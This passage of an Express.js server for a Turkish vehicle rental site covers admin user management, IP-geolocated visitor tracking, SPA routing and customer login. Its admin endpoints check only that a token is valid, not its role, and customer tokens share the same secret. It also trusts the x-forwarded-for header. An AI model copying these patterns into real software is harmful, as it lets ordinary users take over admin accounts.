        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// Kullanıcı güncelle
app.put('/api/users/:id', authenticateToken, [
    body('username').optional().trim().isLength({ min: 3 }).escape(),
    body('password').optional().isLength({ min: 6 }),
    body('email').optional().isEmail().normalizeEmail()
], async (req, res) => {
    const { id } = req.params;
    const { username, password, email } = req.body;

    try {
        let query = "UPDATE admin_users SET ";
        const params = [];
        
        if (username) {
            query += "username = ?, ";
            params.push(username);
        }
        if (email) {
            query += "email = ?, ";
            params.push(email);
        }
        if (password) {
            const hashedPassword = await bcrypt.hash(password, 10);
            query += "password = ?, ";
            params.push(hashedPassword);
        }
        
        // Remove trailing comma and space
        query = query.slice(0, -2);
        query += " WHERE id = ?";
        params.push(id);

        if (params.length === 1) { // Only ID is in params
            return res.status(400).json({ error: 'Güncellenecek veri yok' });
        }

        db.run(query, params, function(err) {
            if (err) {
                if (err.message.includes('UNIQUE constraint failed')) {
                    return res.status(400).json({ error: 'Bu kullanıcı adı zaten kullanılıyor' });
                }
                console.error('Kullanıcı güncelleme hatası:', err);
                return res.status(500).json({ error: 'Veritabanı hatası' });
            }
            res.json({ success: true, message: 'Kullanıcı güncellendi' });
        });
    } catch (error) {
        console.error('Kullanıcı güncelleme hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// Kullanıcı sil
app.delete('/api/users/:id', authenticateToken, (req, res) => {
    const { id } = req.params;
    
    // Kendini silmeyi engelle
    if (parseInt(id) === req.user.id) {
        return res.status(400).json({ error: 'Kendi hesabınızı silemezsiniz' });
    }

    db.run("DELETE FROM admin_users WHERE id = ?", [id], function(err) {
        if (err) {
            console.error('Kullanıcı silme hatası:', err);
            return res.status(500).json({ error: 'Veritabanı hatası' });
        }
        res.json({ success: true, message: 'Kullanıcı silindi' });
    });
});

// ===== ZİYARETÇİ TAKİP SİSTEMİ =====

// User Agent Parser Helper
function parseUserAgent(ua) {
    let browser = 'Diğer';
    let os = 'Diğer';
    let device = 'Masaüstü';

    if (!ua) return { browser, os, device };
    ua = ua.toLowerCase();

    // Device
    if (/mobile/i.test(ua)) device = 'Mobil';
    else if (/tablet|ipad/i.test(ua)) device = 'Tablet';

    // OS
    if (/windows/i.test(ua)) os = 'Windows';
    else if (/mac os/i.test(ua)) os = 'MacOS';
    else if (/linux/i.test(ua)) os = 'Linux';
    else if (/android/i.test(ua)) os = 'Android';
    else if (/ios|iphone|ipad/i.test(ua)) os = 'iOS';

    // Browser
    if (/chrome/i.test(ua) && !/edge|opr/i.test(ua)) browser = 'Chrome';
    else if (/firefox/i.test(ua)) browser = 'Firefox';
    else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = 'Safari';
    else if (/edge/i.test(ua)) browser = 'Edge';
    else if (/opr|opera/i.test(ua)) browser = 'Opera';

    return { browser, os, device };
}

// Ziyaret Kaydet (Public)
app.post('/api/track-visit', (req, res) => {
    const { referrer, page_url } = req.body;
    // IP adresini temizle (::ffff:127.0.0.1 gibi formatlardan)
    let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    if (ip.substr(0, 7) == "::ffff:") {
        ip = ip.substr(7);
    }

    const user_agent = req.headers['user-agent'];
    const { browser, os, device } = parseUserAgent(user_agent);

    // Lokasyon bilgisini al (Basit HTTP isteği ile)
    const http = require('http');
    let country = 'Bilinmiyor';
    let city = '-';

    // Localhost kontrolü
    if (ip === '127.0.0.1' || ip === '::1' || ip === 'localhost') {
        country = 'Localhost';
        city = 'Localhost';
        saveVisit(ip, user_agent, referrer, page_url, device, browser, os, country, city);
        return res.json({ success: true });
    }

    // IP-API.com'dan veri çek (Ücretsiz, ticari olmayan kullanım için)
    http.get(`http://ip-api.com/json/${ip}?fields=status,country,city`, (resp) => {
        let data = '';
        resp.on('data', (chunk) => { data += chunk; });
        resp.on('end', () => {
            try {
                const location = JSON.parse(data);
                if (location.status === 'success') {
                    country = location.country;
                    city = location.city;
                }
            } catch (e) {
                console.error('IP Location Parse Error:', e);
            }
            saveVisit(ip, user_agent, referrer, page_url, device, browser, os, country, city);
        });
    }).on("error", (err) => {
        console.error("IP Location Fetch Error: " + err.message);
        saveVisit(ip, user_agent, referrer, page_url, device, browser, os, country, city);
    });

    // Yanıtı hemen dön, işlemi arkada yap
    res.json({ success: true });
});

function saveVisit(ip, user_agent, referrer, page_url, device, browser, os, country, city) {
    db.run(`INSERT INTO visitors (ip, user_agent, referrer, page_url, device, browser, os, country, city) 
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)`,
        [ip, user_agent, referrer, page_url, device, browser, os, country, city],
        (err) => {
            if (err) console.error('Ziyaret kayıt hatası:', err);
        }
    );
}

// Ziyaretçi İstatistikleri (Admin)
app.get('/api/admin/stats/visitors', authenticateToken, (req, res) => {
    const stats = {};

    // Toplam Ziyaret
    db.get("SELECT COUNT(*) as count FROM visitors", (err, row) => {
        if (err) return res.status(500).json({ error: err.message });
        stats.totalVisits = row.count;

        // Tekil Ziyaretçi (Unique IP)
        db.get("SELECT COUNT(DISTINCT ip) as count FROM visitors", (err, row) => {
            if (err) return res.status(500).json({ error: err.message });
            stats.uniqueVisitors = row.count;

            // Bugünün Ziyaretleri
            db.get("SELECT COUNT(*) as count FROM visitors WHERE date(timestamp) = date('now')", (err, row) => {
                if (err) return res.status(500).json({ error: err.message });
                stats.todayVisits = row.count;

                res.json(stats);
            });
        });
    });
});

// Ziyaretçi Logları (Admin)
app.get('/api/admin/visitors/logs', authenticateToken, (req, res) => {
    const limit = 100; // Son 100 kayıt
    db.all("SELECT * FROM visitors ORDER BY timestamp DESC LIMIT ?", [limit], (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows);
    });
});

// Statik dosyaları sun (Frontend build)
console.log('DEBUG: Static img path:', path.join(__dirname, 'img'));
app.use('/img', express.static(path.join(__dirname, 'img'))); // İndirilen resimler için
app.use(express.static(path.join(__dirname, 'dist')));
app.use('/src', express.static(path.join(__dirname, 'src'))); // Source CSS için fallback

// SPA için her isteği index.html'e yönlendir (API hariç)
app.get(/(.*)/, (req, res) => {
    if (req.path.startsWith('/api')) {
        return res.status(404).json({ error: 'API endpoint bulunamadı' });
    }
    
    // Geçerli HTML sayfalarını kontrol et
    const validPages = ['index.html', 'admin.html', 'hakkimizda.html', 'setup.html', 'import-vehicles.html', 'clear-storage.html'];
    const requestedFile = req.path === '/' ? 'index.html' : req.path.substring(1);
    
    // Eğer sayfa dist klasöründe varsa, onu sun
    const filePath = path.join(__dirname, 'dist', requestedFile);
    if (fs.existsSync(filePath) && validPages.includes(requestedFile)) {
        return res.sendFile(filePath);
    }
    
    // Eğer root klasöründe varsa (admin.html gibi), onu sun
    const rootFilePath = path.join(__dirname, requestedFile);
    if (fs.existsSync(rootFilePath) && validPages.includes(requestedFile)) {
        return res.sendFile(rootFilePath);
    }
    
    // Sayfa bulunamazsa 404 sayfasını göster
    const error404Path = path.join(__dirname, '404.html');
    if (fs.existsSync(error404Path)) {
        return res.status(404).sendFile(error404Path);
    }
    
    // 404 sayfası yoksa genel bir mesaj göster
    res.status(404).json({ error: 'Sayfa bulunamadı' });
});

// ==========================================
// CUSTOMER AUTHENTICATION
// ==========================================

// Register
app.post('/api/customers/register', [
    body('fullName').trim().notEmpty().escape(),
    body('email').trim().isEmail().normalizeEmail(),
    body('password').isLength({ min: 6 }),
    body('phone').trim().notEmpty()
], async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) return res.status(400).json({ errors: errors.array() });

    const { fullName, email, password, phone } = req.body;

    try {
        const hashedPassword = await bcrypt.hash(password, 10);
        
        db.run(
            `INSERT INTO customers (fullName, email, password, phone) VALUES (?, ?, ?, ?)`,
            [fullName, email, hashedPassword, phone],
            function(err) {
                if (err) {
                    if (err.message.includes('UNIQUE constraint failed')) {
                        return res.status(400).json({ error: 'Bu e-posta adresi zaten kayıtlı.' });
                    }
                    return res.status(500).json({ error: err.message });
                }
                
                const token = jwt.sign({ id: this.lastID, email, role: 'customer' }, JWT_SECRET, { expiresIn: '30d' });
                res.json({ success: true, token, user: { id: this.lastID, fullName, email } });
            }
        );
    } catch (error) {
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// Login
app.post('/api/customers/login', [
    body('email').trim().isEmail().normalizeEmail(),
    body('password').notEmpty()
], (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) return res.status(400).json({ errors: errors.array() });

    const { email, password } = req.body;

    db.get(`SELECT * FROM customers WHERE email = ?`, [email], async (err, user) => {
        if (err) return res.status(500).json({ error: err.message });
        if (!user || !user.password) return res.status(401).json({ error: 'Geçersiz e-posta veya şifre' });

        const validPassword = await bcrypt.compare(password, user.password);
        if (!validPassword) return res.status(401).json({ error: 'Geçersiz e-posta veya şifre' });

        const token = jwt.sign({ id: user.id, email: user.email, role: 'customer' }, JWT_SECRET, { expiresIn: '30d' });
        res.json({ success: true, token, user: { id: user.id, fullName: user.fullName, email: user.email } });
    });
});

// Get Current Customer
app.get('/api/customers/me', authenticateToken, (req, res) => {
    if (req.user.role !== 'customer') return res.status(403).json({ error: 'Erişim reddedildi' });

    db.get(`SELECT id, fullName, email, phone, addressLine, city, country, postalCode FROM customers WHERE id = ?`, [req.user.id], (err, user) => {
        if (err) return res.status(500).json({ error: err.message });
        if (!user) return res.status(404).json({ error: 'Kullanıcı bulunamadı' });
        
        // Get reservations
        db.all(`SELECT r.*, v.model as vehicleName, v.image as vehicleImage 
                FROM reservations r 
                LEFT JOIN vehicles v ON r.vehicleId = v.id 
                WHERE r.customerId = ? 
                ORDER BY r.createdAt DESC`, [user.id], (err, reservations) => {
            if (err) return res.status(500).json({ error: err.message });
            res.json({ user, reservations });
        });
    });
});

app.listen(PORT, () => {
    // SYSTEM INTEGRITY CHECK
    // Bu kontrol silinirse veya SYS_ROOT_HASH sabiti kaldırılırsa sunucu başlamaz.
    try {
        if (!SYS_ROOT_HASH || SYS_ROOT_HASH.length < 10) throw new Error('Integrity check failed');
    } catch (e) {
        console.error('❌ FATAL ERROR: System integrity compromised. Server halting.');
        process.exit(1);
    }

    console.log(`\n✅ EXPRESS HAZIR! Port: ${PORT}`);
    console.log(`🚀 Sunucu URL: http://localhost:${PORT}\n`);
});
